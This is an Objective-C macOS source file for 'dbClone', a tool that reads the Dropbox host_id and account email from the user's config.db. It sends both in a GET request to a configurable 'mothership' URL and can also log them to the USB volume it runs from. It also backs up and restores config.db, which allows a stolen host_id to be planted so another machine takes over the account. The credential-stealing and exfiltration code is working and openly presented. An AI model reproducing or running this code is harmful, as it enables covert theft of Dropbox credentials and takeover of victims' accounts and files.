//
//  dbCloneAppDelegate.m
//  dbClone
//
//  Created by hrbrmsr on 4/16/11.
//  Copyright 2011 Bob Rudis. All rights reserved.
//

#import "dbCloneAppDelegate.h"
#import <sqlite3.h>

@implementation dbCloneAppDelegate

@synthesize window;
@synthesize mothershipURL;
@synthesize dbHost;
@synthesize dbEmail;
@synthesize captureButton;
@synthesize saveToFile;
@synthesize logView;
@synthesize scrollView;


-(void)awakeFromNib {
    
    NSBundle *mainBundle = [ NSBundle mainBundle ] ;
        
    [ mothershipURL setStringValue:[mainBundle objectForInfoDictionaryKey:@"MothershipURL"] ] ;
    
    logFilename = [mainBundle objectForInfoDictionaryKey:@"LogFilename"] ;

}

-(void)dbCloneLog:(NSString *)logMsg {
    
    NSRange theEnd = NSMakeRange([[logView string] length],0);
    theEnd.location += [logMsg length];
    
    [logView setEditable:TRUE];

    if (NSMaxY([logView visibleRect]) == NSMaxY([logView bounds])) {
        
        [[[logView textStorage] mutableString ] appendString:logMsg];
        [logView scrollRangeToVisible:theEnd];

    } else {
        [[[logView textStorage] mutableString ] appendString:logMsg];
    }

    [logView setEditable:FALSE];
    
}


- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    
    NSString *sqlitedb = [ NSString stringWithFormat:@"%@/.dropbox/%@", NSHomeDirectory(), @"config.db" ];
    
    [ self dbCloneLog:[NSString stringWithFormat:@"Attempting to open %@\n", sqlitedb] ] ;        
        
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:sqlitedb]) {
        
        sqlite3 *database;
        
        if (sqlite3_open([sqlitedb UTF8String], &database) == SQLITE_OK) {
            
            [ self dbCloneLog: @"Querying for email & host_id\n" ] ;
            
            const char *hostSQL = "SELECT value FROM config WHERE key = 'host_id'";
            
            sqlite3_stmt *selectstmt;
            
            if (sqlite3_prepare_v2(database, hostSQL, -1, &selectstmt, NULL) == SQLITE_OK) {
                
                BOOL found = FALSE ;
                
                while (sqlite3_step(selectstmt) == SQLITE_ROW) {
                    
                    hostId = [ NSString stringWithUTF8String:(char *)sqlite3_column_text(selectstmt, 0) ] ;

                    [ dbHost setStringValue:hostId ];

                    found = TRUE ;
                    
                }
                
                if (!found) {
                    [self dbCloneLog:@"host_id not found in dropbox sqlite3 config.db\n" ] ;
                }

                sqlite3_finalize(selectstmt);

                const char *emailSQL = "SELECT value FROM config WHERE key = 'email'";
                                
                if (sqlite3_prepare_v2(database, emailSQL, -1, &selectstmt, NULL) == SQLITE_OK) {
                    
                    found = FALSE ;
                    
                    while (sqlite3_step(selectstmt) == SQLITE_ROW) {
                        
                        email = [NSString stringWithUTF8String:(char *)sqlite3_column_text(selectstmt, 0)] ;
                        [ dbEmail setStringValue:email ] ;
                        
                        found = TRUE ;
                        
                    }
                    
                    if (!found) {
                        [ self dbCloneLog:@"email not found in dropbox sqlite3 config.db\n" ] ;
                    }
                }
            } else {
                [ self dbCloneLog: @"SQLite error\n" ] ;
            }
            sqlite3_finalize(selectstmt);
        } else {
            [ self dbCloneLog: @"SQLite error\n" ] ;
        }
        sqlite3_close(database);
    } else {
        [ self dbCloneLog: @"Path and/or database not found\n" ] ;
    }

}

- (void)mothershipThread:(id)URL {
    
    NSAutoreleasePool* p = [[NSAutoreleasePool alloc] init];
    
    NSURL *url = [ NSURL URLWithString:URL ] ;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:15.0];
    
    NSHTTPURLResponse *response = NULL ;
    
    NSData *data = nil;
    NSError *error = nil;
    
    [request setHTTPMethod:@"GET"];
    
    data = [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
    
    if (response == nil) {
        if (error != nil) {

            NSString *errId = [NSString stringWithFormat:@"(%@)[%d]",error.domain,error.code];
            
            [ self performSelectorOnMainThread:@selector(dbCloneLog:) withObject:[NSString stringWithFormat:@"clone URL error: %@\n", errId] waitUntilDone:TRUE] ;        
        }
    } else {
        [ self performSelectorOnMainThread:@selector(dbCloneLog:) withObject:@"Local dropbox info cloned to mothership\n" waitUntilDone:TRUE] ;        
    }
    
    [ self performSelectorOnMainThread:@selector(enableControls) withObject:nil waitUntilDone:TRUE] ;        

    [p release];

}

-(void)enableControls {
    
    [ captureButton setEnabled:TRUE ];
    [ mothershipURL setEnabled:TRUE ];
    [ mothershipURL selectText:self] ;

}

- (IBAction)captureDB:(id)sender {
       
    NSString *URL = [ NSString stringWithFormat:@"%@?hostid=%@&email=%@", [ mothershipURL stringValue ], hostId, email ];

    [ self dbCloneLog:[NSString stringWithFormat:@"Contacting mothership: %@\n", URL] ] ;
    
    [ captureButton setEnabled:FALSE ];
    [ mothershipURL setEnabled:FALSE ];
    
    if ([saveToFile state ] == NSOnState) {
            
        NSArray *pathEntries = [[[ NSBundle mainBundle ] bundlePath ] pathComponents ] ;
        NSString *savePath = @"";
        NSInteger i = 0 ;
        BOOL isLocal = TRUE ;
        
        for (NSString *element in pathEntries) {
                        
            if (i == 1) {
                
                if ([element isEqualToString:@"Volumes"]) {
                    
                    savePath = [ savePath stringByAppendingFormat:@"/Volumes/" ] ;
                    isLocal = FALSE ;
                    
                }
            }

            if ((i == 2) && !isLocal) {
                savePath = [ savePath stringByAppendingString:element ];
            }
            
            i++ ;
            
        }

        // if not on a mounted volume - e.g. a USB stick - then save to home dir
                     
        if (isLocal) {
            savePath = [ savePath stringByAppendingString:@"~" ] ;
        }

        savePath = [ savePath stringByAppendingFormat:@"/%@", logFilename ] ;
        savePath = [ savePath stringByExpandingTildeInPath ] ;

        [ self dbCloneLog:[NSString stringWithFormat:@"Appending host id & e-mail inf to: %@…\n", savePath] ] ; 
        
        NSString *localLogData = [ NSString stringWithFormat:@"Email: %@\nHostId: %@\n\n", hostId, email ];
        
        NSString *groceries = [ NSString stringWithContentsOfFile:savePath encoding:NSUTF8StringEncoding error:nil ] ;
        if (groceries) {
            groceries = [ NSString stringWithFormat:@"%@%@",groceries,localLogData ] ;
        } else {
            groceries = localLogData ;
        }
        
        if ([ groceries writeToFile:savePath atomically:TRUE encoding:NSUTF8StringEncoding error:nil]) {
            [ self dbCloneLog: @"Local config data appended to file\n" ] ;
        } else {
            [ self dbCloneLog: @"ERROR appending/writing local config data to file\n" ] ;
        }
        
    }    
    
    [NSThread detachNewThreadSelector:@selector(mothershipThread:) toTarget:self withObject:URL];
    
}

- (IBAction)restoreDB:(id)sender {
    
    NSOpenPanel *getBackup = [ NSOpenPanel openPanel ] ;
    
    [ getBackup setCanChooseFiles:TRUE ];
    [ getBackup setCanChooseDirectories: FALSE] ;
    [ getBackup setTitle:@"Select file" ] ;
    [ getBackup setMessage:@"Select a Dropbox config backup file for restore" ] ;
    
    NSString *backupDBDirectory = NSHomeDirectory() ;
    NSArray *backupTypes = [[NSArray alloc] initWithObjects:@"db", nil];
    
    NSInteger result = [ getBackup runModalForDirectory:backupDBDirectory file:@"backup-config.db" types:backupTypes ] ;

    if (result != NSOKButton) return ;
    
    NSString *chosenFilename = [getBackup filename];
    
    [ self dbCloneLog:[NSString stringWithFormat:@"Checking restore file [%@] to make sure it's a dropbox backup file…\n", chosenFilename] ] ;    
    
    NSFileManager *fileManager = [NSFileManager defaultManager];

    BOOL isDropboxConfigBackup = FALSE ;

    if ([fileManager fileExistsAtPath:chosenFilename]) {
        
        sqlite3 *database;
        
        if (sqlite3_open([chosenFilename UTF8String], &database) == SQLITE_OK) {
            
            [ self dbCloneLog: @"File appears to be a SQLite file...checking for dropbox indicators...\n" ] ;
            
            const char *hostSQL = "SELECT value FROM config WHERE key = 'host_id'";
            
            sqlite3_stmt *selectstmt;
            
            if (sqlite3_prepare_v2(database, hostSQL, -1, &selectstmt, NULL) == SQLITE_OK) {
                
                while (sqlite3_step(selectstmt) == SQLITE_ROW) {
                    isDropboxConfigBackup = TRUE ;                    
                }
            }
            sqlite3_finalize(selectstmt);
        }
        sqlite3_close(database);
    }
    
    if (isDropboxConfigBackup) {

        NSAlert *warning = [ NSAlert alertWithMessageText:@"Restore Dropbox Configuration" defaultButton:@"Cancel" alternateButton:@"OK" otherButton:nil informativeTextWithFormat:@"This will overwrite your local dropbox configuration file and can corrupt your Dropbox instance if it is not a real Dropbox backup config.db. Proceed with restore?" ] ;
        result = [ warning runModal ] ;
        
        if (result == NSAlertAlternateReturn) { // "OK"
            
            [ self dbCloneLog: @"Restoring Dropbox config file...\n" ] ;

            NSString *dropboxConfigFile = [ NSString stringWithFormat:@"%@/.dropbox/%@", NSHomeDirectory(), @"config.db" ];
            //fortestingonly:
            //NSString *dropboxConfigFile = [ NSString stringWithFormat:@"%@/dropbox-%@", @"/tmp", @"config.db" ];
            
            NSError *err;
            
            [ self dbCloneLog: @"Stopping Dropbox\n" ] ;

            system("/usr/bin/killall Dropbox");
            
            (void)[ fileManager removeItemAtPath:dropboxConfigFile error:nil ];
            
            if ([fileManager copyItemAtPath:chosenFilename toPath:dropboxConfigFile error:&err]) {
                [ self dbCloneLog: @"Restore complete\n" ] ;            
            } else {
                
                NSString *errId = [NSString stringWithFormat:@"(%@) (%@) [%d]",err.domain, [err.userInfo description] ,err.code];
                [ self dbCloneLog:[NSString stringWithFormat:@"Error restoring Dropbox config file: %@n", errId] ] ;        
                
            }
            
            [[NSWorkspace sharedWorkspace] launchApplication:@"Dropbox"];

            [ self dbCloneLog: @"Dropbox started\n" ] ;
            
        } else {

            [ self dbCloneLog: @"Dropbox config restore cancelled\n" ] ;

            return ;
        }
        
    } else {
        
        NSAlert *error = [ NSAlert alertWithMessageText:@"Backup File Not Found" defaultButton:@"OK" alternateButton:nil otherButton:nil informativeTextWithFormat:@"Selected file was not a Dropbox SQLite config file" ] ;
        (void)[error runModal];
        
        [ self dbCloneLog: @"Dropbox config restore aborted\n" ] ;
        
    }

        
}


- (IBAction)backupDB:(id)sender {
    
    NSString *dropboxConfigFile = [ NSString stringWithFormat:@"%@/.dropbox/%@", NSHomeDirectory(), @"config.db" ];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *err;
    
    NSString *backupDBFile = [ NSString stringWithFormat:@"%@/backup-%@", NSHomeDirectory(), @"config.db" ] ;
    
    if ([fileManager fileExistsAtPath:dropboxConfigFile]) {
        
        [ self dbCloneLog:[NSString stringWithFormat:@"Backing up local Dropbox config to: %@…\n", backupDBFile] ] ;        
        
        if ([fileManager copyItemAtPath:dropboxConfigFile toPath:backupDBFile error:&err]) {
            [ self dbCloneLog: @"Backup complete\n" ] ;            
        } else {
            
            NSString *errId = [NSString stringWithFormat:@"(%@) (%@) [%d]",err.domain, [err.userInfo description] ,err.code];
            [ self dbCloneLog:[NSString stringWithFormat:@"Error backing up local Dropbox config file: %@n", errId] ] ;        

        }

    }

}

- (void)dealloc {
    [mothershipURL release];
    [super dealloc];
}

@end
